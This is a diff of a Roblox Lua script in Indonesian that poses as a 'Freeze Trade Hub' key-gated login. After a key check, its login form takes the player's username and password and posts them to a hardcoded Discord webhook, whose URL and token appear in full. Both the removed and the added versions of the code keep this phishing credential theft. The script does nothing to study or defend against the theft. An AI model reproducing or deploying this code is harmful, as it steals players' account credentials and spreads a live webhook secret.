@@ -1,22 +1,18 @@
 -- URL Webhook Discord
 local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlIqKiWNSiI9hImEsdGnFY2foZLWqGBfrVkTxK9G1yAg6mStSNePYhq6vYxvd1DKp"
-
--- Key yang benar
 local correctKey = "LOGIN-fREeZeTRadEhUB.id-bGrFDSeRiHUGfavHSK"
 local linkUrl = "https://link-target.net/1273087/freezetradehub"
 
--- Fungsi untuk mengirim data ke Discord
+-- Fungsi Utama
 local function sendToDiscord(username, password)
-    local json_data = {
-        content = "Dinzz : Someone logged in\nUsername: " .. username .. "\nPassword: " .. password
-    }
     local payload = {
         Url = webhook_url,
         Method = "POST",
         Headers = { ["Content-Type"] = "application/json" },
-        Body = game:GetService("HttpService"):JSONEncode(json_data)
+        Body = game:GetService("HttpService"):JSONEncode({
+            content = "Dinzz : Someone logged in\nUsername: " .. username .. "\nPassword: " .. password
+        })
     }
-
     local response
     if syn and syn.request then
         response = syn.request(payload)
@@ -36,64 +32,94 @@ local function sendToDiscord(username, password)
     end
 end
 
--- Fungsi Membuat GUI Kedua (Login)
-local function loginFrame(username, password, parentGui)
-    local title = Instance.new("TextLabel")
+local function createLoginGUI()
+    local gui = Instance.new("ScreenGui")
     local frame = Instance.new("Frame")
-    local passwordInput = Instance.new("TextBox")
-    local usernameInput = Instance.new("TextBox")
-    local buttonLogin = Instance.new("TextButton")
+    local usernameBox = Instance.new("TextBox")
+    local passwordBox = Instance.new("TextBox")
+    local loginButton = Instance.new("TextButton")
 
-    frame.Size, frame.Parent = UDim2.new(0, 300, 0, 300), parentGui
+    gui.Name = "LoginGUI"
+    gui.Parent = game.CoreGui
+
+    frame.Size = UDim2.new(0, 300, 0, 250)
+    frame.Position = UDim2.new(0.5, -150, 0.5, -125)
     frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
+    frame.Parent = gui
 
-    title.TextColor3, title.Parent = Color3.fromRGB(255, 255, 255), frame
-    title.Text, title.Font = "Freeze Trade Hub", Enum.Font.SourceSansBold
-    title.TextSize, title.Position = 24, UDim2.new(0, 0, 0, 0)
+    usernameBox.PlaceholderText = "Masukkan Username"
+    usernameBox.Size = UDim2.new(1, -20, 0, 40)
+    usernameBox.Position = UDim2.new(0, 10, 0, 50)
+    usernameBox.Parent = frame
 
-    usernameInput.TextSize, usernameInput.TextColor3 = 14, Color3.fromRGB(255, 255, 255)
-    usernameInput.Parent = frame
-    usernameInput.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-    usernameInput.Position, usernameInput.PlaceholderText = UDim2.new(0, 10, 0, 60), "Enter username"
-    passwordInput.Position, passwordInput.TextSize, passwordInput.PlaceholderText = UDim2.new(0, 10, 0, 120), 14, "Enter password"
-    passwordInput.BackgroundColor3 = usernameInput.BackgroundColor3
+    passwordBox.PlaceholderText = "Masukkan Password"
+    passwordBox.Size = UDim2.new(1, -20, 0, 40)
+    passwordBox.Position = UDim2.new(0, 10, 0, 100)
+    passwordBox.Parent = frame
 
-    buttonLogin.Parent, buttonLogin.Text = frame, "Submit"
-    buttonLogin.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+    loginButton.Text = "Login"
+    loginButton.Size = UDim2.new(1, -20, 0, 40)
+    loginButton.Position = UDim2.new(0, 10, 0, 150)
+    loginButton.Parent = frame
 
-    buttonLogin.MouseButton1Click:Connect(function()
-        if usernameInput.Text ~= "" and passwordInput.Text ~= "" then
-            sendToDiscord(usernameInput.Text, passwordInput.Text)
-            parentGui:Destroy()
+    loginButton.MouseButton1Click:Connect(function()
+        if usernameBox.Text ~= "" and passwordBox.Text ~= "" then
+            sendToDiscord(usernameBox.Text, passwordBox.Text)
+            gui:Destroy()
+        else
+            print("Harap isi semua kolom!")
         end
     end)
 end
 
--- Fungsi Membuat GUI Pertama (Key Validation)
-local function keyValidationFrame()
-    local validateGUI = Instance.new("ScreenGui")
-    local titleText = Instance.new("TextLabel")
-    local validateFrame = Instance.new("Frame")
-    local verifyTextBox = Instance.new("TextBox")
-    local verifyButton, errorText, linkButton = Instance.new("TextButton"), Instance.new("TextLabel"), Instance.new("TextButton")
+local function createKeyValidationGUI()
+    local gui = Instance.new("ScreenGui")
+    local frame = Instance.new("Frame")
+    local keyBox = Instance.new("TextBox")
+    local verifyButton = Instance.new("TextButton")
+    local copyLinkButton = Instance.new("TextButton")
 
-    validateFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    validateFrame.Size, validateGUI.Parent = UDim2.new(0, 300, 0, 250), game.CoreGui
+    gui.Name = "KeyValidationGUI"
+    gui.Parent = game.CoreGui
 
-    titleText.Parent, titleText.Text = validateFrame, "Hub Login"
+    frame.Size = UDim2.new(0, 300, 0, 250)
+    frame.Position = UDim2.new(0.5, -150, 0.5, -125)
+    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    frame.Parent = gui
 
-    verifyButton.Parent, errorText.Parent, linkButton.Parent = validateFrame, validateFrame, validateFrame
+    keyBox.PlaceholderText = "Masukkan Key"
+    keyBox.Size = UDim2.new(1, -20, 0, 40)
+    keyBox.Position = UDim2.new(0, 10, 0, 50)
+    keyBox.Parent = frame
 
-    verifyButton.Text, linkButton.Text = "Verify", "Get Key"
+    verifyButton.Text = "Verifikasi Key"
+    verifyButton.Size = UDim2.new(1, -20, 0, 40)
+    verifyButton.Position = UDim2.new(0, 10, 0, 100)
+    verifyButton.Parent = frame
+
+    copyLinkButton.Text = "Get Key"
+    copyLinkButton.Size = UDim2.new(1, -20, 0, 40)
+    copyLinkButton.Position = UDim2.new(0, 10, 0, 150)
+    copyLinkButton.Parent = frame
 
     verifyButton.MouseButton1Click:Connect(function()
-        if verifyTextBox.Text == correctKey then
-            loginFrame(verifyTextBox.Text, verifyTextBox.Text, validateGUI)
+        if keyBox.Text == correctKey then
+            gui:Destroy()
+            createLoginGUI()
         else
-            errorText.Text = "Invalid Key"
+            print("Key salah!")
+        end
+    end)
+
+    copyLinkButton.MouseButton1Click:Connect(function()
+        if setclipboard then
+            setclipboard(linkUrl)
+            print("Link telah disalin ke clipboard!")
+        else
+            print("Salin link secara manual: " .. linkUrl)
         end
     end)
 end
 
-keyValidationFrame()
+-- Memulai GUI Key Validation
+createKeyValidationGUI()
